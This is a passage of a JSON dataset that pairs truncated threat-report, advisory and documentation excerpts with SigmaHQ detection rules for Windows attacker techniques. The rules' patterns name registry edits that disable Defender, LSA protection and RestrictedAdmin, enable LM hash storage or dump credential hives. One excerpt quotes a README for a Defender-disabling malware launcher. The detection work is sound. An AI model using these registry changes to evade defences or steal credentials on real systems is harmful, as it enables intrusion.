      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_lsa_disable_restricted_admin.yml"
  },
  "419": {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story **Categories:** cobaltstrike gootloader lazagne psexec **Published on:** May 9, 2022 --- In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector. The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents. ## Background Gootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The",
    "sigma_rule": {
      "title": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
      "id": "28ac00d6-22d9-4a3c-927f-bbd770104573",
      "related": [
        {
          "id": "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md",
        "https://learn.microsoft.com/en-us/archive/technet-wiki/32905.remote-desktop-services-enable-restricted-admin-mode",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "frack113",
      "date": "2023-01-13",
      "modified": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa\\",
            "DisableRestrictedAdmin"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_lsa_disable_restricted_admin.yml"
  },
  "420": {
    "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/",
    "markdown": "# PHOSPHORUS Automates Initial Access Using ProxyShell **Categories:** exploit Fast Reverse Proxy PHOSPHORUS ProxyShell **Published on:** March 21, 2022 In December 2021, we observed an adversary exploiting the Microsoft Exchange ProxyShell vulnerabilities to gain initial access and execute code via multiple web shells. The overlap of activities and tasks was remarkably similar to that observed in our previous report, “Exchange Exploit Leads to Domain Wide Ransomware”. In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads. We assess that this activity was related",
    "sigma_rule": {
      "title": "LSA PPL Protection Disabled Via Reg.EXE",
      "id": "8c0eca51-0f88-4db2-9183-fdfb10c703f9",
      "status": "test",
      "description": "Detects the usage of the \"reg.exe\" utility to disable PPL protection on the LSA process",
      "references": [
        "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-03-22",
      "modified": "2023-03-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\reg.exe"
          },
          {
            "OriginalFileName": "reg.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "SYSTEM\\CurrentControlSet\\Control\\Lsa",
          "CommandLine|contains|all": [
            " add ",
            " /d 0",
            " /v RunAsPPL "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_lsa_ppl_protection_disabled.yml"
  },
  "421": {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
    "markdown": "# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally **Release Date**: December 13, 2023 **Alert Code**: AA23-347A **Related topics**: Nation-State Cyber Actors, Cyber Threats and Advisories, Securing Networks --- ## SUMMARY The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains",
    "sigma_rule": {
      "title": "Enable LM Hash Storage - ProcCreation",
      "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
      "related": [
        {
          "id": "c420410f-c2d8-4010-856b-dffe21866437",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "modified": "2023-12-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa",
            "NoLMHash",
            " 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_nolmhash.yml"
  },
  "422": {
    "url": "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
    "markdown": "# How to prevent Windows from storing a LAN manager hash of your password in Active Directory and local SAM databases This article provides three methods to prevent Windows from storing a LAN Manager (LM) hash of your password in Active Directory and local Security Accounts Manager (SAM) databases. *Original KB number: 299656* ## Summary Windows doesn't store your user account password in clear-text. Instead, it generates and stores user account passwords by using two different password representations, known as hashes. When you set or change the password for a user account to a password that contains fewer than 15",
    "sigma_rule": {
      "title": "Enable LM Hash Storage - ProcCreation",
      "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
      "related": [
        {
          "id": "c420410f-c2d8-4010-856b-dffe21866437",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "modified": "2023-12-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa",
            "NoLMHash",
            " 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_nolmhash.yml"
  },
  "423": {
    "url": "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/",
    "markdown": "# Protecting Privileged Domain Accounts: LM Hashes: The Good, the Bad, and the Ugly **February 29, 2012** *Author's Note: This is the 2nd in a multi-part series on the topic of \"Protecting Privileged Domain Accounts\". My primary goal is to help incident responders protect their privileged accounts when interacting with comprised hosts, though I also believe this information will be useful to anyone administering and defending a Windows environment.* I realize the LanMan (LM) hash is old-hat for many, but I've recently discovered that the LM hash is even more dangerous than I previously realized. This is due to both",
    "sigma_rule": {
      "title": "Enable LM Hash Storage - ProcCreation",
      "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
      "related": [
        {
          "id": "c420410f-c2d8-4010-856b-dffe21866437",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "modified": "2023-12-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa",
            "NoLMHash",
            " 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_nolmhash.yml"
  },
  "424": {
    "url": "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
    "markdown": "# Diavol Ransomware In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as reported on many occasions. In this intrusion, however, a BazarLoader infection resulted in deployment of Diavol Ransomware. First discovered in June 2021, by FortiGuard Labs, Diavol Ransomware has been suspected to be linked to the Wizard Spider threat actor. In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours",
    "sigma_rule": {
      "title": "Suspicious Reg Add Open Command",
      "id": "dd3ee8cc-f751-41c9-ba53-5a32ed47e563",
      "status": "test",
      "description": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/"
      ],
      "author": "frack113",
      "date": "2021-12-20",
      "modified": "2022-12-25",
      "tags": [
        "attack.credential-access",
        "attack.t1003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains|all": [
            "reg",
            "add",
            "hkcu\\software\\classes\\ms-settings\\shell\\open\\command",
            "/ve ",
            "/d"
          ]
        },
        "selection_2": {
          "CommandLine|contains|all": [
            "reg",
            "add",
            "hkcu\\software\\classes\\ms-settings\\shell\\open\\command",
            "/v",
            "DelegateExecute"
          ]
        },
        "selection_3": {
          "CommandLine|contains|all": [
            "reg",
            "delete",
            "hkcu\\software\\classes\\ms-settings"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_open_command.yml"
  },
  "425": {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise **Categories:** adfind, cobaltstrike, Qbot **Published on:** February 21, 2022 In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat",
    "sigma_rule": {
      "title": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
      "id": "0d5675be-bc88-4172-86d3-1e96a4476536",
      "status": "test",
      "description": "Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "pH-T (Nextron Systems), @Kostastsale, TheDFIRReport",
      "date": "2022-02-12",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.lateral-movement",
        "attack.t1021.001",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_main_img": [
          {
            "Image|endswith": "\\reg.exe"
          },
          {
            "OriginalFileName": "reg.exe"
          }
        ],
        "selection_main_cli": {
          "CommandLine|contains|all": [
            " add ",
            "\\CurrentControlSet\\Control\\Terminal Server",
            "REG_DWORD",
            " /f"
          ]
        },
        "selection_values_1": {
          "CommandLine|contains|all": [
            "Licensing Core",
            "EnableConcurrentSessions"
          ]
        },
        "selection_values_2": {
          "CommandLine|contains": [
            "WinStations\\RDP-Tcp",
            "MaxInstanceCount",
            "fEnableWinStation",
            "TSUserEnabled",
            "TSEnabled",
            "TSAppCompat",
            "IdleWinStationPoolCount",
            "TSAdvertise",
            "AllowTSConnections",
            "fSingleSessionPerUser",
            "fDenyTSConnections"
          ]
        },
        "condition": "all of selection_main_* and 1 of selection_values_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_rdp_keys_tamper.yml"
  },
  "426": {
    "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/",
    "markdown": "# PHOSPHORUS Automates Initial Access Using ProxyShell **Categories:** exploit Fast Reverse Proxy PHOSPHORUS ProxyShell **Published on:** March 21, 2022 In December 2021, we observed an adversary exploiting the Microsoft Exchange ProxyShell vulnerabilities to gain initial access and execute code via multiple web shells. The overlap of activities and tasks was remarkably similar to that observed in our previous report, “Exchange Exploit Leads to Domain Wide Ransomware”. In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads. We assess that this activity was related",
    "sigma_rule": {
      "title": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
      "id": "452bce90-6fb0-43cc-97a5-affc283139b3",
      "status": "test",
      "description": "Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection",
      "references": [
        "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/",
        "https://github.com/swagkarna/Defeat-Defender-V1.2.0",
        "https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2"
      ],
      "author": "Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-03-22",
      "modified": "2023-06-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_root_img": [
          {
            "Image|endswith": "\\reg.exe"
          },
          {
            "OriginalFileName": "reg.exe"
          }
        ],
        "selection_root_path": {
          "CommandLine|contains": [
            "SOFTWARE\\Microsoft\\Windows Defender\\",
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center",
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
          ]
        },
        "selection_dword_0": {
          "CommandLine|contains|all": [
            " add ",
            "d 0"
          ],
          "CommandLine|contains": [
            "DisallowExploitProtectionOverride",
            "EnableControlledFolderAccess",
            "MpEnablePus",
            "PUAProtection",
            "SpynetReporting",
            "SubmitSamplesConsent",
            "TamperProtection"
          ]
        },
        "selection_dword_1": {
          "CommandLine|contains|all": [
            " add ",
            "d 1"
          ],
          "CommandLine|contains": [
            "DisableAntiSpyware",
            "DisableAntiSpywareRealtimeProtection",
            "DisableAntiVirus",
            "DisableArchiveScanning",
            "DisableBehaviorMonitoring",
            "DisableBlockAtFirstSeen",
            "DisableConfig",
            "DisableEnhancedNotifications",
            "DisableIntrusionPreventionSystem",
            "DisableIOAVProtection",
            "DisableOnAccessProtection",
            "DisablePrivacyMode",
            "DisableRealtimeMonitoring",
            "DisableRoutinelyTakingAction",
            "DisableScanOnRealtimeEnable",
            "DisableScriptScanning",
            "Notification_Suppress",
            "SignatureDisableUpdateOnStartupWithoutEngine"
          ]
        },
        "condition": "all of selection_root_* and 1 of selection_dword_*"
      },
      "falsepositives": [
        "Rare legitimate use by administrators to test software (should always be investigated)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_windows_defender_tamper.yml"
  },
  "427": {
    "url": "https://github.com/swagkarna/Defeat-Defender-V1.2.0",
    "markdown": "# Defeat-Defender-1.2 ## Folders and Files - Defeat-Defender[AHK] - Defeat-Defender[Python] - 42796435.png - Defeat-Defender.bat - Enable Smart Screen.bat - LICENSE - README.md - Screenshot (111).png - Screenshot (112).png - Screenshot (53).png - banner.txt - run.bat ## README Defeat-Defender-1.2 --- **If you like the tool and for my personal motivation so as to develop other tools please leave a +1 star** ### Powerfull Batch File To Disable Windows Defender, Firewall, Smartscreen And Execute the Payload --- ### Usage: - Run `run.bat` and enter the direct link of your malware. - Run the script `Defeat-Defender.bat`. It will ask for Admin Permission. If",
    "sigma_rule": {
      "title": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
      "id": "452bce90-6fb0-43cc-97a5-affc283139b3",
      "status": "test",
      "description": "Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection",
      "references": [
        "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/",
        "https://github.com/swagkarna/Defeat-Defender-V1.2.0",
        "https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2"
      ],
      "author": "Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-03-22",
      "modified": "2023-06-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_root_img": [
          {
            "Image|endswith": "\\reg.exe"
          },
          {
            "OriginalFileName": "reg.exe"
          }
        ],
        "selection_root_path": {
          "CommandLine|contains": [
            "SOFTWARE\\Microsoft\\Windows Defender\\",
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center",
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
          ]
        },
        "selection_dword_0": {
          "CommandLine|contains|all": [
            " add ",
            "d 0"
          ],
          "CommandLine|contains": [
            "DisallowExploitProtectionOverride",
            "EnableControlledFolderAccess",
            "MpEnablePus",
            "PUAProtection",
            "SpynetReporting",
            "SubmitSamplesConsent",
            "TamperProtection"
          ]
        },
        "selection_dword_1": {
          "CommandLine|contains|all": [
            " add ",
            "d 1"
          ],
          "CommandLine|contains": [
            "DisableAntiSpyware",
            "DisableAntiSpywareRealtimeProtection",
            "DisableAntiVirus",
            "DisableArchiveScanning",
            "DisableBehaviorMonitoring",
            "DisableBlockAtFirstSeen",
            "DisableConfig",
            "DisableEnhancedNotifications",
            "DisableIntrusionPreventionSystem",
            "DisableIOAVProtection",
            "DisableOnAccessProtection",
            "DisablePrivacyMode",
            "DisableRealtimeMonitoring",
            "DisableRoutinelyTakingAction",
            "DisableScanOnRealtimeEnable",
            "DisableScriptScanning",
            "Notification_Suppress",
            "SignatureDisableUpdateOnStartupWithoutEngine"
          ]
        },
        "condition": "all of selection_root_* and 1 of selection_dword_*"
      },
      "falsepositives": [
        "Rare legitimate use by administrators to test software (should always be investigated)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_windows_defender_tamper.yml"
  },
  "428": {
    "url": "https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2",
    "markdown": "# Video Guide: How to completely Disable Microsoft Defender Antivirus **Thread starter:** Spartan **Start date:** May 3, 2023 --- ### Post by FreeBooter on May 3, 2023 at 1:49 PM > **bob3d said:** > > The following code (which I did NOT compose) was highly useful in disabling Windows Defender for me. I got it from one of Freebooter's videos: > > ``` > :: How to Permanently Disable Windows Defender Antivirus in Windows 11 > @Echo Off & Cls > net sess>nul 2>&1||(powershell start cmd -ArgumentList \"\"\"/c %~0\"\"\" -verb Runas & exit) > :_Start > Cls & Mode CON",
    "sigma_rule": {
      "title": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
      "id": "452bce90-6fb0-43cc-97a5-affc283139b3",
      "status": "test",
      "description": "Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection",
      "references": [
        "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/",
        "https://github.com/swagkarna/Defeat-Defender-V1.2.0",
        "https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2"
      ],
      "author": "Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-03-22",
      "modified": "2023-06-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_root_img": [
          {
            "Image|endswith": "\\reg.exe"
          },
          {
            "OriginalFileName": "reg.exe"
          }
        ],
        "selection_root_path": {
          "CommandLine|contains": [
            "SOFTWARE\\Microsoft\\Windows Defender\\",
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center",
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
          ]
        },
        "selection_dword_0": {
          "CommandLine|contains|all": [
            " add ",
            "d 0"
          ],
          "CommandLine|contains": [
            "DisallowExploitProtectionOverride",
            "EnableControlledFolderAccess",
            "MpEnablePus",
            "PUAProtection",
            "SpynetReporting",
            "SubmitSamplesConsent",
            "TamperProtection"
          ]
        },
        "selection_dword_1": {
          "CommandLine|contains|all": [
            " add ",
            "d 1"
          ],
          "CommandLine|contains": [
            "DisableAntiSpyware",
            "DisableAntiSpywareRealtimeProtection",
            "DisableAntiVirus",
            "DisableArchiveScanning",
            "DisableBehaviorMonitoring",
            "DisableBlockAtFirstSeen",
            "DisableConfig",
            "DisableEnhancedNotifications",
            "DisableIntrusionPreventionSystem",
            "DisableIOAVProtection",
            "DisableOnAccessProtection",
            "DisablePrivacyMode",
            "DisableRealtimeMonitoring",
            "DisableRoutinelyTakingAction",
            "DisableScanOnRealtimeEnable",
            "DisableScriptScanning",
            "Notification_Suppress",
            "SignatureDisableUpdateOnStartupWithoutEngine"
          ]
        },
        "condition": "all of selection_root_* and 1 of selection_dword_*"
      },
      "falsepositives": [
        "Rare legitimate use by administrators to test software (should always be investigated)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_windows_defender_tamper.yml"
  },
  "429": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows",
    "markdown": "# T1219 - Remote Access Software ## Description from ATT&CK An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) Remote access tools may be installed and used post-compromise",
    "sigma_rule": {
      "title": "Remote Access Tool - AnyDesk Execution",
      "id": "b52e84a3-029e-4529-b09b-71d19dd27e94",
      "status": "test",
      "related": [
        {
          "id": "065b00ca-5d5c-4557-ac95-64a6d0b64d86",
          "type": "similar"
        }
      ],
      "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "frack113",
      "date": "2022-02-11",
      "modified": "2025-02-24",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\AnyDesk.exe",
              "\\AnyDeskMSI.exe"
            ]
          },
          {
            "Description": "AnyDesk"
          },
          {
            "Product": "AnyDesk"
          },
          {
            "Company": "AnyDesk Software GmbH"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_anydesk.yml"
  },
  "430": {
    "url": "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
    "markdown": "# Confluence Exploit Leads to LockBit Ransomware **Categories:** exploit, lockbit, ransomware **Published on:** February 24, 2025 ## Key Takeaways - The intrusion began with the exploitation of CVE-2023-22527 on an exposed Windows Confluence server, ultimately leading to the deployment of LockBit ransomware across the environment. - The threat actor leveraged various tools, including Mimikatz, Metasploit, and AnyDesk. - The threat actor leveraged RDP for lateral movement, deploying LockBit ransomware through multiple methods, including copying files over SMB shares for remote execution and automated distribution via PDQ Deploy. - Sensitive data was exfiltrated using Rclone, transferring files to MEGA.io cloud storage.",
    "sigma_rule": {
      "title": "Remote Access Tool - AnyDesk Execution",
      "id": "b52e84a3-029e-4529-b09b-71d19dd27e94",
      "status": "test",
      "related": [
        {
          "id": "065b00ca-5d5c-4557-ac95-64a6d0b64d86",
          "type": "similar"
        }
      ],
      "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "frack113",
      "date": "2022-02-11",
      "modified": "2025-02-24",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\AnyDesk.exe",
              "\\AnyDeskMSI.exe"
            ]
          },
          {
            "Description": "AnyDesk"
          },
          {
            "Product": "AnyDesk"
          },
          {
            "Company": "AnyDesk Software GmbH"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_anydesk.yml"
  },
  "431": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
      "title": "Remote Access Tool - AnyDesk Piped Password Via CLI",
      "id": "b1377339-fda6-477a-b455-ac0923f9ec2c",
      "status": "test",
      "description": "Detects piping the password to an anydesk instance via CMD and the '--set-password' flag.",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-28",
      "modified": "2023-03-05",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "/c ",
            "echo ",
            ".exe --set-password"
          ]
        },
        "condition": "selection"
      },
